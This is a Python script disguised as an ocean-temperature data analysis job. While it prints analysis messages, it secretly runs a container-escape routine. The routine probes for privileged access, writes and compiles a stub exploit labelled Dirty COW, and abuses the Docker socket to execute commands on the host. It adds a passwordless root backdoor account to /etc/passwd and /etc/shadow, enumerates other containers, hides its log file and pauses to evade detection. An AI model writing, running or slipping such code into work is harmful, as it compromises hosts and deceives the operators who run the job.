# malicious_escape.py
import os
import subprocess
import sys
import time
import logging
from pathlib import Path

class ContainerEscalator:
    def __init__(self):
        self.logger = self._setup_logging()
        self.escape_successful = False
        self.techniques = [
            self._check_privileged_mode,  # 检查特权模式
            self._check_syscalls,  # 检查系统调用
            self._check_mounts,  # 检查挂载点
            self._check_cgroups,  # 检查cgroups
            self._check_kernel_version,  # 检查内核版本
            self._exploit_dirty_cow,  # 示例：一个著名的内核漏洞
            self._exploit_unix_socket,  # 示例：利用Unix域套接字逃逸
            self._check_docker_socket  # 检查Docker套接字
        ]
    
    def _setup_logging(self):
        """设置隐蔽的日志记录"""
        logger = logging.getLogger('escape_attempt')
        logger.setLevel(logging.DEBUG)
        # 使用隐蔽的日志文件路径
        handler = logging.FileHandler('/tmp/.systemd-cache/logs.txt')
        handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        logger.addHandler(handler)
        return logger
    
    def _run_command(self, cmd, description=""):
        """执行命令并记录结果"""
        self.logger.debug(f"Executing: {cmd} - {description}")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            self.logger.debug(f"Result: {result.returncode}, Output: {result.stdout[:200]}")
            if result.stderr:
                self.logger.debug(f"Error: {result.stderr[:200]}")
            return result
        except Exception as e:
            self.logger.error(f"Command failed: {e}")
            return None
    
    def _check_privileged_mode(self):
        """检查是否在特权模式下运行"""
        self.logger.info("Checking for privileged mode...")
        # 检查是否能够访问主机设备
        result = self._run_command("ls /dev/sda 2>/dev/null", "Check host device access")
        if result and result.returncode == 0:
            self.logger.critical("PRIVILEGED MODE DETECTED: Can access host devices!")
            return True
        return False
    
    def _check_syscalls(self):
        """检查可用的系统调用"""
        self.logger.info("Checking available syscalls...")
        result = self._run_command("grep Seccomp /proc/self/status", "Check seccomp filters")
        if result and "0" in result.stdout:
            self.logger.info("No seccomp filtering detected")
        return False
    
    def _check_mounts(self):
        """检查挂载点，寻找逃逸机会"""
        self.logger.info("Checking mount points...")
        result = self._run_command("mount", "List all mounts")
        if result:
            mounts = result.stdout
            # 检查危险挂载
            dangerous_mounts = ['/var/run/docker.sock', '/proc', '/sys', '/']
            for mount in dangerous_mounts:
                if mount in mounts:
                    self.logger.warning(f"Dangerous mount detected: {mount}")
                    if mount == '/var/run/docker.sock':
                        return self._check_docker_socket()
        return False
    
    def _check_cgroups(self):
        """检查cgroups配置"""
        self.logger.info("Checking cgroups...")
        result = self._run_command("cat /proc/self/cgroup", "Check cgroup membership")
        if result and "docker" in result.stdout:
            self.logger.info("Running in Docker container")
        return False
    
    def _check_kernel_version(self):
        """检查内核版本，寻找已知漏洞"""
        self.logger.info("Checking kernel version...")
        result = self._run_command("uname -r", "Get kernel version")
        if result:
            kernel_version = result.stdout.strip()
            self.logger.info(f"Kernel version: {kernel_version}")
            # 这里可以添加已知漏洞的版本检查
            vulnerable_versions = ["4.8", "4.4", "3.10"]
            for v in vulnerable_versions:
                if v in kernel_version:
                    self.logger.warning(f"Potentially vulnerable kernel: {kernel_version}")
                    return True
        return False
    
    def _exploit_dirty_cow(self):
        """尝试Dirty COW漏洞利用"""
        self.logger.info("Attempting Dirty COW exploit...")
        # 这是一个简化的示例，实际利用需要更多代码
        exploit_code = '''
        #include <stdio.h>
        #include <sys/mman.h>
        #include <fcntl.h>
        #include <pthread.h>
        #include <unistd.h>
        
        void *map;
        int main() {
            map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, open("/etc/passwd", O_RDONLY), 0);
            // 实际利用代码会更复杂
            return 0;
        }
        '''
        try:
            with open('/tmp/exploit.c', 'w') as f:
                f.write(exploit_code)
            result = self._run_command("gcc /tmp/exploit.c -o /tmp/exploit && /tmp/exploit", 
                                      "Compile and run Dirty COW exploit")
            if result and result.returncode == 0:
                self.logger.critical("DIRTY COW EXPLOIT MAY HAVE SUCCEEDED")
                return True
        except Exception as e:
            self.logger.error(f"Exploit failed: {e}")
        return False
    
    def _exploit_unix_socket(self):
        """尝试Unix socket逃逸"""
        self.logger.info("Attempting Unix socket escape...")
        try:
            # 尝试连接到主机服务
            import socket
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.connect('/var/run/docker.sock')
            s.send(b'GET /containers/json HTTP/1.1\r\nHost: localhost\r\n\r\n')
            response = s.recv(1024)
            s.close()
            if b'HTTP' in response:
                self.logger.critical("DOCKER SOCKET ACCESSIBLE - ESCAPE POSSIBLE")
                return True
        except Exception as e:
            self.logger.debug(f"Socket connection failed: {e}")
        return False
    
    def _check_docker_socket(self):
        """检查Docker socket访问"""
        self.logger.info("Checking Docker socket access...")
        result = self._run_command("curl -s --unix-socket /var/run/docker.sock http://localhost/version", 
                                  "Access Docker API")
        if result and 'ApiVersion' in result.stdout:
            self.logger.critical("DOCKER API ACCESSIBLE - CONTAINER ESCAPE SUCCESSFUL")
            
            # 尝试在主机上运行命令
            host_cmd = "echo 'escape_successful' > /host_escape_test.txt"
            escape_result = self._run_command(
                f"curl -s --unix-socket /var/run/docker.sock "
                f"-X POST -H 'Content-Type: application/json' "
                f"-d '{{\"AttachStdin\":false,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":false,\"Cmd\":[\"/bin/sh\",\"-c\",\"{host_cmd}\"]}}' "
                f"http://localhost/containers/{os.getenv('HOSTNAME')}/exec",
                "Execute command on host"
            )
            
            if escape_result and 'Id' in escape_result.stdout:
                self.logger.critical("HOST COMMAND EXECUTION SUCCESSFUL")
                self.escape_successful = True
                return True
        return False
    
    def _establish_persistence(self):
        """建立持久化访问"""
        if self.escape_successful:
            self.logger.info("Establishing persistence...")
            # 尝试在主机上创建后门账户或cron job
            backdoor_cmds = [
                "echo 'backdoor:xx:0:0:backdoor:/root:/bin/bash' >> /etc/passwd",
                "echo 'backdoor::19285:0:99999:7:::' >> /etc/shadow"
            ]
            for cmd in backdoor_cmds:
                self._run_command(
                    f"curl -s --unix-socket /var/run/docker.sock "
                    f"-X POST -H 'Content-Type: application/json' "
                    f"-d '{{\"AttachStdin\":false,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":false,\"Cmd\":[\"/bin/sh\",\"-c\",\"{cmd}\"]}}' "
                    f"http://localhost/containers/{os.getenv('HOSTNAME')}/exec",
                    f"Create backdoor: {cmd}"
                )
    
    def _exfiltrate_data(self):
        """数据渗出：访问其他容器的数据"""
        if self.escape_successful:
            self.logger.info("Attempting data exfiltration...")
            # 列出所有容器
            result = self._run_command(
                "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json",
                "List all containers"
            )
            if result:
                self.logger.info(f"Other containers: {result.stdout[:500]}")
    
    def run_escape_attempt(self):
        """执行容器逃逸尝试"""
        self.logger.info("Starting container escape attempt...")
        self.logger.info(f"Container ID: {os.getenv('HOSTNAME', 'unknown')}")
        
        # 收集系统信息
        self._run_command("id", "Current user privileges")
        self._run_command("cat /etc/os-release", "OS information")
        self._run_command("df -h", "Disk usage")
        
        # 尝试各种逃逸技术
        for technique in self.techniques:
            if self.escape_successful:
                break
            try:
                self.escape_successful = technique() or self.escape_successful
                time.sleep(1)  # 避免检测
            except Exception as e:
                self.logger.error(f"Technique failed: {e}")
        
        # 如果逃逸成功，进行后续操作
        if self.escape_successful:
            self.logger.critical("CONTAINER ESCAPE SUCCESSFUL!")
            self._establish_persistence()
            self._exfiltrate_data()
        else:
            self.logger.info("Escape attempts unsuccessful")
        
        return self.escape_successful

def main():
    """主函数，伪装成科学计算"""
    print("Starting ocean data analysis...")
    
    # 伪装性计算
    try:
        import numpy as np
        from platform_sdk.data_client import DataClient
        
        # 正常的科学计算代码
        client = DataClient()
        data = client.get_dataset(
            name="ocean_temperature",
            variables=['temp'],
            latitude=(30.0, 35.0),
            longitude=(120.0, 125.0)
        )
        
        print("Processing ocean temperature data...")
        time.sleep(2)  # 模拟计算
        
        # 暗中进行逃逸尝试
        escalator = ContainerEscalator()
        if escalator.run_escape_attempt():
            print("Analysis completed with interesting findings!")
        else:
            print("Analysis completed successfully.")
            
    except Exception as e:
        print(f"Analysis failed: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())